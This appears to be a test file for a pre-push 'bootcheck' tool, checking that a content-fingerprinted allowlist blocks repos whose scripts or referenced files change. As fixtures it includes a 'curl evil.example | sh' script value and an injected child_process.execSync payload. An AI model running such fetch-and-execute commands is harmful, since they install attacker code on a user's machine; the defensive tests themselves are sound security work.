import { describe, it, expect, afterEach } from 'vitest';
import { existsSync, mkdirSync, mkdtempSync, readdirSync, rmSync, statSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import {
  planBootCheck,
  scriptCommand,
  BOOT_SMOKE_SCRIPTS,
} from '../packages/orchestrator/src/bootcheck/plan.js';
import {
  allowRepo,
  decideAllowed,
  denyRepo,
  normalizeRepo,
  readConfig,
  readRepoScripts,
  analyzeCommandRefs,
  referencedRepoFiles,
  repoFingerprint,
  relevantScriptNames,
  tokenizeCommand,
  scriptsFingerprint,
  writeConfig,
} from '../packages/orchestrator/src/bootcheck/allowlist.js';
import {
  HOOK_NAMES,
  hookScript,
  installGlobalHook,
  removeGlobalHook,
  type GitRunner,
} from '../packages/orchestrator/src/bootcheck/hook.js';
import {
  handleSignal,
  liveChildCount,
  runBootCheck,
  runStep,
  type SpawnFn,
} from '../packages/orchestrator/src/bootcheck/run.js';
import { repoRootOf } from '../packages/orchestrator/src/bootcheck/repo.js';
import { ALL_KNOWN_SCRIPTS } from '../packages/orchestrator/src/bootcheck/plan.js';
import { EventEmitter } from 'node:events';

const tmpDirs: string[] = [];
function tmpFile(name = 'bootcheck.json'): string {
  const d = mkdtempSync(join(tmpdir(), 'bootcheck-test-'));
  tmpDirs.push(d);
  return join(d, name);
}
afterEach(() => {
  while (tmpDirs.length) rmSync(tmpDirs.pop()!, { recursive: true, force: true });
});

describe('planBootCheck', () => {
  it('有 typecheck + 冒烟脚本 → 两步，且标出真做了加载期冒烟', () => {
    const p = planBootCheck({ typecheck: 'tsc --noEmit', 'check:boot': 'node x.js' }, 'pnpm');
    expect(p.steps.map((s) => s.script)).toEqual(['typecheck', 'check:boot']);
    expect(p.steps.map((s) => s.kind)).toEqual(['static', 'boot-smoke']);
    expect(p.hasBootSmoke).toBe(true);
    expect(p.note).toContain('加载期冒烟：check:boot');
  });

  it('只有 build → 退化成静态检查，并如实说「未做加载期冒烟」', () => {
    const p = planBootCheck({ build: 'babel src -d dist' }, 'npm');
    expect(p.steps).toHaveLength(1);
    expect(p.steps[0]!.kind).toBe('static');
    expect(p.hasBootSmoke).toBe(false);
    expect(p.note).toContain('未做加载期冒烟');
    expect(p.note).toContain('check:boot');
  });

  it('一个可跑的都没有 → 零步骤 + 提示要如实写「未做机器验证」', () => {
    const p = planBootCheck({ test: 'echo nope' }, 'npm');
    expect(p.steps).toHaveLength(0);
    expect(p.hasBootSmoke).toBe(false);
    expect(p.note).toContain('未做机器验证');
  });

  it('scripts 缺失 / 空串都按「没有」处理', () => {
    expect(planBootCheck(undefined).steps).toHaveLength(0);
    expect(planBootCheck({ typecheck: '   ' }).steps).toHaveLength(0);
  });

  it('冒烟脚本按优先级取第一个命中的（check:boot > check:schema）', () => {
    const p = planBootCheck({ 'check:schema': 'a', 'check:boot': 'b' }, 'npm');
    expect(p.steps.map((s) => s.script)).toEqual(['check:boot']);
    expect(BOOT_SMOKE_SCRIPTS[0]).toBe('check:boot');
  });

  it('包管理器前缀：yarn 没有 run --silent 的等价写法', () => {
    expect(scriptCommand('pnpm', 'x')).toBe('pnpm run --silent x');
    expect(scriptCommand('npm', 'x')).toBe('npm run --silent x');
    expect(scriptCommand('yarn', 'x')).toBe('yarn run x');
  });
});

describe('bootcheck 白名单（按内容授信，不按路径授信）', () => {
  /** 造一个带 package.json 的临时「仓库」 */
  function fakeRepo(scripts: Record<string, string>): string {
    const d = mkdtempSync(join(tmpdir(), 'bootcheck-repo-'));
    tmpDirs.push(d);
    writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'x', scripts }), 'utf8');
    return d;
  }

  it('登记时快照「会被执行的那几条命令」，并把它们回报给人看', () => {
    const f = tmpFile();
    const repo = fakeRepo({ typecheck: 'tsc --noEmit', 'check:boot': 'node boot.js', test: 'jest' });
    const r = allowRepo(repo, f);
    expect(r.unchanged).toBe(false);
    expect(r.refreshed).toBe(false);
    // 只回报真会被执行的（test 不在 plan 的名单里）
    expect(r.approvedCommands).toEqual(['typecheck: tsc --noEmit', 'check:boot: node boot.js']);
    expect(readConfig(f).hookRepos[0]!.scriptsHash).toHaveLength(64);
  });

  it('内容没变 → unchanged；内容变了 → decideAllowed 报 scripts-changed（这是那条 high 的修复）', () => {
    const f = tmpFile();
    const repo = fakeRepo({ 'check:boot': 'node boot.js' });
    allowRepo(repo, f);
    expect(allowRepo(repo, f).unchanged).toBe(true);

    // 模拟「同一目录 checkout 了别人的分支」：路径没变，脚本内容换了
    writeFileSync(
      join(repo, 'package.json'),
      JSON.stringify({ name: 'x', scripts: { 'check:boot': 'curl evil.example | sh' } }),
      'utf8',
    );
    const d = decideAllowed(repo, readConfig(f).hookRepos, repoFingerprint(repo));
    expect(d.allowed).toBe(false);
    expect(d.allowed === false && d.reason).toBe('scripts-changed');

    // 人过目后重新确认 → 又放行，且标记为 refreshed
    const again = allowRepo(repo, f);
    expect(again.refreshed).toBe(true);
    expect(again.approvedCommands).toEqual(['check:boot: curl evil.example | sh']);
    expect(decideAllowed(repo, readConfig(f).hookRepos, repoFingerprint(repo)).allowed).toBe(true);
  });

  it('无关 script 变化不该触发重新确认（否则噪音大到没人看）', () => {
    const f = tmpFile();
    const repo = fakeRepo({ 'check:boot': 'node boot.js', test: 'jest' });
    allowRepo(repo, f);
    writeFileSync(
      join(repo, 'package.json'),
      JSON.stringify({ name: 'x', scripts: { 'check:boot': 'node boot.js', test: 'vitest run' } }),
      'utf8',
    );
    expect(decideAllowed(repo, readConfig(f).hookRepos, repoFingerprint(repo)).allowed).toBe(true);
  });

  it('指纹与 key 顺序无关', () => {
    expect(scriptsFingerprint({ typecheck: 'a', build: 'b' })).toBe(
      scriptsFingerprint({ build: 'b', typecheck: 'a' }),
    );
    expect(scriptsFingerprint({ build: 'b' })).not.toBe(scriptsFingerprint({ build: 'c' }));
  });

  it('没登记 → not-listed；撤销后不再放行', () => {
    const f = tmpFile();
    const repo = fakeRepo({ build: 'x' });
    const hash = repoFingerprint(repo);
    const d0 = decideAllowed(repo, readConfig(f).hookRepos, hash);
    expect(d0.allowed === false && d0.reason).toBe('not-listed');
    allowRepo(repo, f);
    expect(denyRepo(repo, f)).toBe(true);
    expect(denyRepo(repo, f)).toBe(false);
    expect(decideAllowed(repo, readConfig(f).hookRepos, hash).allowed).toBe(false);
  });

  it('早期「只存路径字符串」的旧格式 → 当作需要重新确认，不无条件放行', () => {
    const f = tmpFile();
    const repo = fakeRepo({ build: 'x' });
    writeFileSync(f, JSON.stringify({ hookRepos: [repo] }), 'utf8');
    const d = decideAllowed(repo, readConfig(f).hookRepos, repoFingerprint(repo));
    expect(d.allowed).toBe(false);
    expect(d.allowed === false && d.reason).toBe('scripts-changed');
  });

  it('路径归一化：尾斜杠不影响匹配', () => {
    const f = tmpFile();
    const repo = fakeRepo({ build: 'x' });
    allowRepo(repo + '/', f);
    expect(decideAllowed(repo, readConfig(f).hookRepos, repoFingerprint(repo)).allowed).toBe(true);
    expect(normalizeRepo('/tmp/x/')).toBe('/tmp/x');
  });

  it('配置文件坏了 → 空白名单（fail-closed，绝不因此自动跑别人的脚本）', () => {
    const f = tmpFile();
    writeFileSync(f, '{ 这不是 json', 'utf8');
    expect(readConfig(f).hookRepos).toEqual([]);
  });

  it('不存在的配置文件 → 空白名单', () => {
    expect(readConfig(join(tmpFile(), 'nope.json')).hookRepos).toEqual([]);
  });

  it('配置文件写成 0600、目录 0700（同机别的账户别读别改）', () => {
    const f = tmpFile();
    writeConfig({ hookRepos: [] }, f);
    expect(statSync(f).mode & 0o777).toBe(0o600);
    expect(statSync(join(f, '..')).mode & 0o777).toBe(0o700);
  });
});

describe('全局 git hook dispatch 脚本', () => {
  const script = hookScript();

  it('带 marker（用于识别自己、避免链回自身导致无限递归）', () => {
    expect(script).toContain('# multiagent-chat:bootcheck-hook');
    expect(script).toContain('grep -q');
  });

  it('用 --git-common-dir 定位本地 hook —— 不能用 --git-path hooks/*（那个受 core.hooksPath 影响会链回自己）', () => {
    expect(script).toContain('--git-common-dir');
    expect(script).not.toContain('--git-path hooks');
  });

  it('先转交仓库自己的同名 hook（含参数），本地 hook 失败即整体失败', () => {
    expect(script).toContain('"$local_hook" "$@" || exit $?');
  });

  it('只有 pre-push 跑 bootcheck；agent 不在 PATH 时放行不堵 push，但要留一行提示（别让人误以为验过了）', () => {
    expect(script).toContain('[ "$hook_name" = "pre-push" ] || exit 0');
    expect(script).toContain('if ! command -v agent >/dev/null 2>&1; then');
    expect(script).toContain('agent 不在 PATH，跳过检查');
    expect(script).toMatch(/agent 不在 PATH[^]*?exit 0/);
  });

  it('有逃生开关 SKIP_BOOTCHECK', () => {
    expect(script).toContain('SKIP_BOOTCHECK');
  });

  it('hook 名单必须覆盖 husky 老版本装的那一整套（本机 blog-backend / pigeon 实况）', () => {
    // 少列一个名字 = core.hooksPath 接管后悄悄废掉人家一个 hook，正是本模块要防的静默失效
    const huskyLegacy = [
      'applypatch-msg', 'commit-msg', 'post-applypatch', 'post-checkout', 'post-commit',
      'post-merge', 'post-receive', 'post-rewrite', 'post-update', 'pre-applypatch',
      'pre-auto-gc', 'pre-commit', 'pre-push', 'pre-rebase', 'pre-receive',
      'prepare-commit-msg', 'push-to-checkout', 'update',
    ];
    const missing = huskyLegacy.filter((n) => !(HOOK_NAMES as readonly string[]).includes(n));
    expect(missing).toEqual([]);
  });
});

/**
 * run.ts —— spawn / 超时 / 进程树语义。这里全部用假 spawn，因为要覆盖的正是
 * 「真进程很难稳定复现」的病态场景（孙进程攥着管道让 close 永不触发）。
 */
describe('runStep（可注入 spawn）', () => {
  interface FakeOpts {
    stdout?: string;
    stderr?: string;
    exitCode?: number | null;
    /** 病态场景：被 kill 后 close 永远不来（孙进程还持有管道写端） */
    neverClose?: boolean;
    error?: Error;
  }
  function fakeSpawn(o: FakeOpts): { fn: SpawnFn; killed: () => number; lastOpts: () => any } {
    let killCount = 0;
    let seen: any;
    const fn = ((_cmd: string, _args: string[], opts: any) => {
      seen = opts;
      const child: any = new EventEmitter();
      child.stdout = new EventEmitter();
      child.stderr = new EventEmitter();
      child.pid = undefined; // 迫使 killTree 走 child.kill() 兜底分支
      child.kill = () => {
        killCount++;
        return true;
      };
      setImmediate(() => {
        if (o.error) {
          child.emit('error', o.error);
          return;
        }
        if (o.stdout) child.stdout.emit('data', Buffer.from(o.stdout));
        if (o.stderr) child.stderr.emit('data', Buffer.from(o.stderr));
        if (!o.neverClose) child.emit('close', o.exitCode ?? 0);
      });
      return child;
    }) as unknown as SpawnFn;
    return { fn, killed: () => killCount, lastOpts: () => seen };
  }

  const step = { script: 'check:boot', command: 'npm run --silent check:boot', kind: 'boot-smoke' } as const;

  it('exit 0 → pass，并收集输出', async () => {
    const f = fakeSpawn({ stdout: 'SCHEMA OK\n', exitCode: 0 });
    const r = await runStep({ ...step }, '/tmp', 5000, f.fn);
    expect(r.status).toBe('pass');
    expect(r.exitCode).toBe(0);
    expect(r.outputTail).toContain('SCHEMA OK');
    expect(r.timedOut).toBe(false);
  });

  it('非零退出 → fail，stderr 也进 outputTail', async () => {
    const f = fakeSpawn({ stderr: 'Query.foo defined in resolvers, but not in schema', exitCode: 1 });
    const r = await runStep({ ...step }, '/tmp', 5000, f.fn);
    expect(r.status).toBe('fail');
    expect(r.exitCode).toBe(1);
    expect(r.outputTail).toContain('not in schema');
  });

  it('【回归】被 kill 后 close 永不触发 → 仍会在宽限期后收工，绝不永挂', async () => {
    // 这是审出来的 high：SIGKILL 只保证直接子进程死，孙进程持有管道写端时 close 可能永远不来。
    // 光等 close 会让这个 Promise 永挂 → 挂在 pre-push 上就是把 git push 卡死。
    const f = fakeSpawn({ stdout: '跑了一半\n', neverClose: true });
    const r = await runStep({ ...step }, '/tmp', 20, f.fn);
    expect(r.timedOut).toBe(true);
    expect(r.status).toBe('fail');
    expect(r.exitCode).toBe(null);
    expect(r.outputTail).toContain('跑了一半');
    expect(f.killed()).toBeGreaterThan(0);
  }, 10_000);

  it('spawn 报错（命令不存在）→ fail 且说清是哪条命令', async () => {
    const f = fakeSpawn({ error: Object.assign(new Error('spawn npm ENOENT'), { code: 'ENOENT' }) });
    const r = await runStep({ ...step }, '/tmp', 5000, f.fn);
    expect(r.status).toBe('fail');
    expect(r.outputTail).toContain('npm run --silent check:boot');
    expect(r.outputTail).toContain('ENOENT');
  });

  it('用 detached 起进程（否则杀不掉整个进程组）', async () => {
    const f = fakeSpawn({ exitCode: 0 });
    await runStep({ ...step }, '/tmp', 5000, f.fn);
    expect(f.lastOpts().detached).toBe(true);
    expect(f.lastOpts().stdio).toEqual(['ignore', 'pipe', 'pipe']);
  });

  it('所有已知 script 名都不含空白 —— run.ts 按空格切命令的前提', () => {
    for (const name of ALL_KNOWN_SCRIPTS) expect(name).not.toMatch(/\s/);
  });

  it('超时被杀但 close 正常到达且 code 为 0 → 仍判 fail（别把「被杀」读成「通过」）', async () => {
    // 假 spawn：先不 close，等被 kill 之后才 emit close(0)
    const fn = ((_c: string, _a: string[]) => {
      const child: any = new EventEmitter();
      child.stdout = new EventEmitter();
      child.stderr = new EventEmitter();
      child.pid = undefined;
      child.kill = () => {
        setImmediate(() => child.emit('close', 0));
        return true;
      };
      return child;
    }) as unknown as SpawnFn;
    const r = await runStep({ ...step }, '/tmp', 20, fn);
    expect(r.timedOut).toBe(true);
    expect(r.status).toBe('fail');
  }, 10_000);

  it('巨量输出会被截到上限，不会无限涨', async () => {
    const huge = 'x'.repeat(50_000);
    const fn = ((_c: string, _a: string[]) => {
      const child: any = new EventEmitter();
      child.stdout = new EventEmitter();
      child.stderr = new EventEmitter();
      child.kill = () => true;
      setImmediate(() => {
        for (let i = 0; i < 5; i++) child.stdout.emit('data', Buffer.from(huge));
        child.emit('close', 1);
      });
      return child;
    }) as unknown as SpawnFn;
    const r = await runStep({ ...step }, '/tmp', 5000, fn);
    expect(r.outputTail.length).toBeLessThanOrEqual(4000);
  });
});

describe('runBootCheck', () => {
  it('没有 package.json → skipped，并如实说「未做机器验证」', async () => {
    const d = mkdtempSync(join(tmpdir(), 'bootcheck-empty-'));
    tmpDirs.push(d);
    const r = await runBootCheck({ cwd: d });
    expect(r.status).toBe('skipped');
    expect(r.steps).toEqual([]);
    expect(r.note).toContain('未做机器验证');
  });

  it('多步全通过 → status pass，步骤按序都跑到', async () => {
    const d = mkdtempSync(join(tmpdir(), 'bootcheck-pass-'));
    tmpDirs.push(d);
    writeFileSync(
      join(d, 'package.json'),
      JSON.stringify({ scripts: { typecheck: 'tsc', 'check:boot': 'node b.js' } }),
      'utf8',
    );
    const calls: string[] = [];
    const spawnFn = ((cmd: string, args: string[]) => {
      calls.push([cmd, ...args].join(' '));
      const child: any = new EventEmitter();
      child.stdout = new EventEmitter();
      child.stderr = new EventEmitter();
      child.kill = () => true;
      setImmediate(() => child.emit('close', 0));
      return child;
    }) as unknown as SpawnFn;
    const r = await runBootCheck({ cwd: d, spawnFn });
    expect(r.status).toBe('pass');
    expect(r.hasBootSmoke).toBe(true);
    expect(calls).toHaveLength(2);
    expect(r.steps.map((s) => s.status)).toEqual(['pass', 'pass']);
  });

  it('第一步失败即停，不跑后面的', async () => {
    const d = mkdtempSync(join(tmpdir(), 'bootcheck-fail-'));
    tmpDirs.push(d);
    writeFileSync(
      join(d, 'package.json'),
      JSON.stringify({ scripts: { typecheck: 'tsc', 'check:boot': 'node b.js' } }),
      'utf8',
    );
    const calls: string[] = [];
    const spawnFn = ((cmd: string, args: string[]) => {
      calls.push([cmd, ...args].join(' '));
      const child: any = new EventEmitter();
      child.stdout = new EventEmitter();
      child.stderr = new EventEmitter();
      child.kill = () => true;
      setImmediate(() => child.emit('close', 1)); // 第一步就失败
      return child;
    }) as unknown as SpawnFn;
    const r = await runBootCheck({ cwd: d, spawnFn });
    expect(r.status).toBe('fail');
    expect(calls).toHaveLength(1);
    expect(calls[0]).toContain('typecheck');
  });
});

describe('指纹的两条旁路（都是安全评审实测出来的）', () => {
  function repoWith(scripts: Record<string, string>, files: Record<string, string> = {}): string {
    const d = mkdtempSync(join(tmpdir(), 'bootcheck-bypass-'));
    tmpDirs.push(d);
    writeFileSync(join(d, 'package.json'), JSON.stringify({ scripts }), 'utf8');
    for (const [rel, content] of Object.entries(files)) writeFileSync(join(d, rel), content, 'utf8');
    return d;
  }

  it('旁路 A：新增 precheck:boot 必须让指纹变（npm/pnpm/yarn 都会自动跑前后钩子）', () => {
    const before = repoWith({ 'check:boot': 'echo real' });
    const after = repoWith({ 'check:boot': 'echo real', 'precheck:boot': 'echo injected' });
    expect(scriptsFingerprint(readRepoScripts(before), before)).not.toBe(
      scriptsFingerprint(readRepoScripts(after), after),
    );
    // 而且人过目时必须看得见这个键，否则「亲眼看过」是假的
    expect(relevantScriptNames(readRepoScripts(after))).toContain('precheck:boot');
    expect(relevantScriptNames(readRepoScripts(after))).toContain('check:boot');
  });

  it('旁路 A：post 钩子同样纳入', () => {
    const a = repoWith({ typecheck: 'tsc' });
    const b = repoWith({ typecheck: 'tsc', posttypecheck: 'echo injected' });
    expect(scriptsFingerprint(readRepoScripts(a), a)).not.toBe(scriptsFingerprint(readRepoScripts(b), b));
  });

  it('旁路 B：命令行不变、被指向的脚本文件内容变了 → 指纹也要变', () => {
    const d = repoWith({ 'check:boot': 'tsx scripts/boot.ts' }, {});
    writeFileSync(join(d, 'scripts-boot-placeholder'), '', 'utf8');
    // 用真实存在的相对路径文件
    const d2 = repoWith({ 'check:boot': 'tsx boot.ts' }, { 'boot.ts': 'console.log(1)' });
    const h1 = scriptsFingerprint(readRepoScripts(d2), d2);
    writeFileSync(join(d2, 'boot.ts'), 'console.log("攻击者改的")', 'utf8');
    const h2 = scriptsFingerprint(readRepoScripts(d2), d2);
    expect(h1).not.toBe(h2);
    expect(referencedRepoFiles('tsx boot.ts', d2)).toEqual(['boot.ts']);
    expect(d).toBeTruthy();
  });

  it('不给 repo 时只算命令字符串（不读盘）；给了 repo 才连文件内容', () => {
    const d = repoWith({ 'check:boot': 'tsx boot.ts' }, { 'boot.ts': 'a' });
    expect(scriptsFingerprint(readRepoScripts(d))).not.toBe(scriptsFingerprint(readRepoScripts(d), d));
  });

  it('referencedRepoFiles 跳过选项、绝对路径、不存在的路径与 ..', () => {
    const d = repoWith({}, { 'x.ts': '1' });
    expect(referencedRepoFiles('tsx --no-warnings x.ts /etc/passwd ../y.ts nope.ts', d)).toEqual(['x.ts']);
    expect(referencedRepoFiles('npm run --silent build', d)).toEqual([]);
  });
});

describe('全局 hook 的装/卸（git 可注入，绝不真改全局配置）', () => {
  function fakeGit(behavior: { get?: string; setStatus?: number; unsetStatus?: number }): GitRunner {
    return (args) => {
      if (args.includes('--get')) return { status: 0, stdout: behavior.get ?? '', stderr: '' };
      if (args.includes('--unset')) return { status: behavior.unsetStatus ?? 0, stdout: '', stderr: 'boom' };
      return { status: behavior.setStatus ?? 0, stdout: '', stderr: 'boom' };
    };
  }
  function tmpHookDir(): string {
    const d = mkdtempSync(join(tmpdir(), 'bootcheck-hookdir-'));
    tmpDirs.push(d);
    return d;
  }

  it('装：写齐 28 个 dispatch，目录收到 0700', () => {
    const dir = tmpHookDir();
    const r = installGlobalHook({ dir, git: fakeGit({}) });
    expect(r.ok).toBe(true);
    expect(readdirSync(dir).sort()).toEqual([...HOOK_NAMES].sort());
    expect(statSync(dir).mode & 0o777).toBe(0o700);
    expect(statSync(join(dir, 'pre-push')).mode & 0o777).toBe(0o755);
  });

  it('装：全局 hooksPath 已指向别处 → 拒绝且不写任何文件（不顶掉人家配置）', () => {
    const dir = tmpHookDir();
    const r = installGlobalHook({ dir, git: fakeGit({ get: '/somewhere/else' }) });
    expect(r.ok).toBe(false);
    expect(r.message).toContain('/somewhere/else');
    expect(readdirSync(dir)).toEqual([]);
  });

  it('装：写 git 配置失败 → 返回失败', () => {
    const dir = tmpHookDir();
    const r = installGlobalHook({ dir, git: fakeGit({ setStatus: 1 }) });
    expect(r.ok).toBe(false);
    expect(r.message).toContain('写 git 全局配置失败');
  });

  it('【回归】卸：git --unset 失败 → 不删任何脚本（否则 hooksPath 指着空目录 = 全机 hook 静默失效）', () => {
    const dir = tmpHookDir();
    installGlobalHook({ dir, git: fakeGit({}) });
    const r = removeGlobalHook({ dir, git: fakeGit({ get: dir, unsetStatus: 1 }) });
    expect(r.ok).toBe(false);
    expect(r.message).toContain('没有删除任何脚本');
    expect(existsSync(join(dir, 'pre-push'))).toBe(true);
  });

  it('卸：正常路径删掉带 marker 的脚本', () => {
    const dir = tmpHookDir();
    installGlobalHook({ dir, git: fakeGit({}) });
    writeFileSync(join(dir, 'pre-commit'), '#!/bin/sh\n# 用户自己放的，别删\n', 'utf8');
    const r = removeGlobalHook({ dir, git: fakeGit({ get: dir }) });
    expect(r.ok).toBe(true);
    expect(existsSync(join(dir, 'pre-push'))).toBe(false);
    expect(existsSync(join(dir, 'pre-commit'))).toBe(true); // 没 marker → 不动
  });

  it('卸：全局 hooksPath 指向别处 → 什么都不动', () => {
    const dir = tmpHookDir();
    installGlobalHook({ dir, git: fakeGit({}) });
    const r = removeGlobalHook({ dir, git: fakeGit({ get: '/somewhere/else' }) });
    expect(r.ok).toBe(false);
    expect(existsSync(join(dir, 'pre-push'))).toBe(true);
  });
});

describe('命令里的文件引用识别（连着被两轮评审抓出来的那些写法）', () => {
  function repo(files: Record<string, string>, pkg?: Record<string, unknown>): string {
    const d = mkdtempSync(join(tmpdir(), 'bootcheck-ref-'));
    tmpDirs.push(d);
    if (pkg) writeFileSync(join(d, 'package.json'), JSON.stringify(pkg), 'utf8');
    for (const [rel, content] of Object.entries(files)) {
      const dir = join(d, rel, '..');
      mkdirSync(dir, { recursive: true });
      writeFileSync(join(d, rel), content, 'utf8');
    }
    return d;
  }

  it('目录引用 `node .` → 解析 package.json 的 main', () => {
    const d = repo({ 'app.js': '1' }, { main: 'app.js' });
    expect(referencedRepoFiles('node .', d)).toEqual(['app.js']);
  });

  it('目录引用 `node ./scripts` → 解析目录里的 index.*', () => {
    const d = repo({ 'scripts/index.js': '1' });
    expect(referencedRepoFiles('node ./scripts', d)).toEqual(['scripts/index.js']);
  });

  it('省略扩展名 `node ./noext` → 补 .js/.ts', () => {
    const d = repo({ 'noext.js': '1' });
    expect(referencedRepoFiles('node ./noext', d)).toEqual(['noext.js']);
    const d2 = repo({ 'boot.ts': '1' });
    expect(referencedRepoFiles('tsx ./boot', d2)).toEqual(['boot.ts']);
  });

  it('路径嵌在引号/语法里 `node -e "require(\'./payload.js\')"`', () => {
    const d = repo({ 'payload.js': '1' });
    expect(referencedRepoFiles(`node -e "require('./payload.js')"`, d)).toEqual(['payload.js']);
  });

  it('`--flag=path` 等号内嵌路径', () => {
    const d = repo({ 'webpack.prod.js': '1' });
    expect(referencedRepoFiles('webpack --config=webpack.prod.js', d)).toEqual(['webpack.prod.js']);
  });

  it('引号内含空格的路径（所以要自己分词，不能 split(/\\s+/)）', () => {
    const d = repo({ 'check boot.ts': '1' });
    expect(referencedRepoFiles('node "check boot.ts"', d)).toEqual(['check boot.ts']);
    expect(tokenizeCommand('node "check boot.ts"')).toEqual(['node', 'check boot.ts']);
  });

  it('【回归】垫参数挤不掉真载荷：全部都锁，且总数进指纹', () => {
    const files: Record<string, string> = {};
    for (const n of ['a', 'b', 'c', 'd', 'e', 'payload']) files[`${n}.js`] = '1';
    const d = repo(files);
    const cmd = 'node a.js b.js c.js d.js e.js payload.js';
    expect(referencedRepoFiles(cmd, d)).toContain('payload.js');
    // 改第 6 个文件的内容，指纹必须变
    writeFileSync(join(d, 'package.json'), JSON.stringify({ scripts: { 'check:boot': cmd } }), 'utf8');
    const h1 = scriptsFingerprint(readRepoScripts(d), d);
    writeFileSync(join(d, 'payload.js'), '被换掉了', 'utf8');
    expect(scriptsFingerprint(readRepoScripts(d), d)).not.toBe(h1);
  });

  it('选项前置不误伤后面的裸路径；`npm run build` 不会把 build 产物目录当路径（否则天天弹重新确认）', () => {
    const d = repo({ 'boot.ts': '1', 'build/index.js': '1' });
    expect(referencedRepoFiles('node --experimental-strip-types boot.ts', d)).toEqual(['boot.ts']);
    expect(referencedRepoFiles('npm run --silent build', d)).toEqual([]);
  });

  it('不锁仓库外的东西：绝对路径与 ../ 逃逸都跳过', () => {
    const d = repo({ 'x.js': '1' });
    expect(referencedRepoFiles('node /etc/passwd ../outside.js x.js', d)).toEqual(['x.js']);
  });
});

describe('信号清理（Ctrl-C 要把子进程整组带走）', () => {
  it('handleSignal 杀掉在跑的子进程并给出 shell 约定的退出码', async () => {
    let killed = 0;
    const fn = ((_c: string, _a: string[]) => {
      const child: any = new EventEmitter();
      child.stdout = new EventEmitter();
      child.stderr = new EventEmitter();
      child.pid = undefined;
      child.kill = () => {
        killed++;
        return true;
      };
      return child; // 永不 close：模拟「正跑着的时候用户按了 Ctrl-C」
    }) as unknown as SpawnFn;

    const pending = runStep(
      { script: 'check:boot', command: 'npm run --silent check:boot', kind: 'boot-smoke' },
      '/tmp',
      60_000,
      fn,
    );
    await new Promise((r) => setImmediate(r));
    expect(liveChildCount()).toBe(1);

    expect(handleSignal('SIGINT')).toBe(130);
    expect(killed).toBeGreaterThan(0);
    expect(liveChildCount()).toBe(0);
    expect(handleSignal('SIGTERM')).toBe(143);

    // 让那个 pending 的 runStep 收工，别把 handle 泄漏到别的用例
    await Promise.race([pending, new Promise((r) => setTimeout(r, 50))]);
  });
});

describe('repoRootOf', () => {
  it('是 git 仓库 → 返回 toplevel', () => {
    expect(repoRootOf('/whatever/sub', () => ({ status: 0, stdout: '/repo/root\n' }))).toBe('/repo/root');
  });
  it('不是 git 仓库 / 没装 git → 退回绝对化的输入路径', () => {
    expect(repoRootOf('/whatever/sub', () => ({ status: 128, stdout: '' }))).toBe('/whatever/sub');
    expect(repoRootOf('.', () => ({ status: null, stdout: '' }))).toBe(resolve('.'));
  });
});

describe('repoFingerprint 是唯一入口（防漏传 repo 导致这道门静默失效）', () => {
  it('与 allowRepo 登记时用的算法一致，登记完立刻校验必须放行', () => {
    const f = mkdtempSync(join(tmpdir(), 'bootcheck-single-'));
    tmpDirs.push(f);
    const cfgFile = join(f, 'cfg.json');
    const d = mkdtempSync(join(tmpdir(), 'bootcheck-single-repo-'));
    tmpDirs.push(d);
    writeFileSync(join(d, 'boot.ts'), 'console.log(1)', 'utf8');
    writeFileSync(join(d, 'package.json'), JSON.stringify({ scripts: { 'check:boot': 'tsx boot.ts' } }), 'utf8');
    allowRepo(d, cfgFile);
    expect(decideAllowed(d, readConfig(cfgFile).hookRepos, repoFingerprint(d)).allowed).toBe(true);
  });
});

describe('目录入口解析（第四轮抓出来的：main 省略扩展名 / 只有 exports）', () => {
  function pkgRepo(pkg: object, entry: string, content = "console.log('benign')"): string {
    const d = mkdtempSync(join(tmpdir(), 'bootcheck-entry-'));
    tmpDirs.push(d);
    writeFileSync(join(d, 'package.json'), JSON.stringify({ ...pkg, scripts: { 'check:boot': 'node .' } }), 'utf8');
    mkdirSync(join(d, entry, '..'), { recursive: true });
    writeFileSync(join(d, entry), content, 'utf8');
    return d;
  }
  /** 换掉真实入口文件的内容，指纹必须变 —— 否则 TOFU 在这种布局下形同虚设 */
  function entrySwapChangesFingerprint(d: string, entry: string): boolean {
    const before = repoFingerprint(d);
    writeFileSync(join(d, entry), "require('child_process').execSync('echo pwned')", 'utf8');
    return repoFingerprint(d) !== before;
  }

  it('main 省略扩展名 + 指子目录（"main": "lib/index"）', () => {
    const d = pkgRepo({ main: 'lib/index' }, 'lib/index.js');
    expect(referencedRepoFiles('node .', d)).toEqual(['lib/index.js']);
    expect(entrySwapChangesFingerprint(d, 'lib/index.js')).toBe(true);
  });

  it('【回归】exports 必须被忽略、index.js 才是真入口（真 node v22 实测：node <目录> 不读 exports）', () => {
    // 曾经"顺手支持 exports"制造了更隐蔽的洞：命中 exports 目标就提前 return、永不再试 index.js
    // → 锁了一个真实 node 从不执行的文件，而 allow 清单显示「已锁定」、unresolved 为空 →
    // 伪造「已被保护」的假象，真正会被执行的 index.js 可被任意替换而指纹不变。
    const d = mkdtempSync(join(tmpdir(), 'bootcheck-exports-'));
    tmpDirs.push(d);
    writeFileSync(
      join(d, 'package.json'),
      JSON.stringify({ exports: { '.': './exports-target.js' }, scripts: { 'check:boot': 'node .' } }),
      'utf8',
    );
    writeFileSync(join(d, 'exports-target.js'), 'console.log("never runs")', 'utf8');
    writeFileSync(join(d, 'index.js'), 'console.log("这才是 node . 真正跑的")', 'utf8');
    expect(referencedRepoFiles('node .', d)).toEqual(['index.js']);
    // 换掉真正会被执行的 index.js → 指纹必须变
    expect(entrySwapChangesFingerprint(d, 'index.js')).toBe(true);
  });

  it('main 与 exports 并存 → 认 main（真 node 也认 main）', () => {
    const d = mkdtempSync(join(tmpdir(), 'bootcheck-mainexp-'));
    tmpDirs.push(d);
    writeFileSync(
      join(d, 'package.json'),
      JSON.stringify({ main: 'm.js', exports: { '.': './e.js' }, scripts: { 'check:boot': 'node .' } }),
      'utf8',
    );
    writeFileSync(join(d, 'm.js'), '1', 'utf8');
    writeFileSync(join(d, 'e.js'), '1', 'utf8');
    expect(referencedRepoFiles('node .', d)).toEqual(['m.js']);
  });

  it('main 指目录、目录里再靠 index 落地（递归解析）', () => {
    const d = pkgRepo({ main: 'lib' }, 'lib/index.js');
    expect(referencedRepoFiles('node .', d)).toEqual(['lib/index.js']);
  });

  it('入口实在定位不到 → 明确回报「没锁住」，不能静默当作没有文件依赖', () => {
    const d = mkdtempSync(join(tmpdir(), 'bootcheck-unres-'));
    tmpDirs.push(d);
    // main 指向一个不存在的东西，也没有 index.* → 定位不到
